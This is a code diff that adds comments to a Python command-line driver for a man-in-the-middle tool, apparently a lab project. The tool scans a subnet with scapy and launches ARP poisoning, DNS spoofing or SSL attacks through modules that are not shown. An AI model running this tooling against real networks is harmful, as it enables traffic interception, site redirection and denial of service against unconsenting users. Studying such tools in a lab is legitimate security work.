@@ -4,6 +4,8 @@ import arpForward
 import dnsSpoofing
 import httpResponse
 
+
+# command line user interface using the classes ARP, DNS and SSL
 def main():
     networkInterface = ""
     victimIP = []
@@ -11,12 +13,18 @@ def main():
     urlList = {}
     devicesListOnNetwork = {}
 
+    # var:typeOfAttack = arp/dns/ssl
     typeOfAttack = sys.argv[1]
+
+    # var:silentMode = True : mitm arp, var:silentMode = False : dos arp
     silentMode = None
+
     print("Start")
+    # check correctness of input var:typeOfAttack
     while typeOfAttack != "arp" and typeOfAttack != "dns" and typeOfAttack != "ssl":
         typeOfAttack = input("Wrong mode of attack chose. Select arp/dns/ssl :")
 
+    # sets the mode of arp attack
     if typeOfAttack == "arp" :
 
         modeOfAttack = input("Do you want silent mode [y/n]:")
@@ -30,6 +38,8 @@ def main():
 
     networkInterface = input("Enter network interface name (e.g. enp0s3) :")
     print("Scanning the network .. ")
+
+    #scans network for available ip adresses and their correspoding mac
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"),timeout = 2, iface=networkInterface, verbose = False)
     for arg1, arg2 in ans:
         devicesListOnNetwork.update ({arg2[ARP].psrc : arg2[ARP].hwsrc})
@@ -56,6 +66,7 @@ def main():
         else :
             print("No IP on network")
 
+    # starting the arp attack
     if typeOfAttack == "arp":
         arpAttack = arpForward.Arp(networkInterface, victimIP, spoofIP, silentMode)
         if silentMode:
@@ -64,6 +75,7 @@ def main():
             print("ARP cache is being poissoned ...")
         arpAttack.start()
 
+    #configure and start dns attack
     if typeOfAttack == "dns":
         url = ""
         redirectTo = ""
@@ -82,6 +94,7 @@ def main():
             while redirectTo not in devicesListOnNetwork.keys():
                 redirectTo = input("Enter sevrer IP where redirect request to (e.f. 192.168.56.102): ")
 
+            # parse input requested website
             url = url.upper()
             urlList.update({url + "": redirectTo})
             if url[0:4] != "WWW.":
@@ -94,7 +107,7 @@ def main():
         dnsAttack.start()
 
 
-
+    #start ssl attack
     if typeOfAttack == "ssl":
         port = input("Enter port (e.g. 8050): ")
         sslAttack = httpResponse.Ssl(victimIP[0], port, networkInterface)
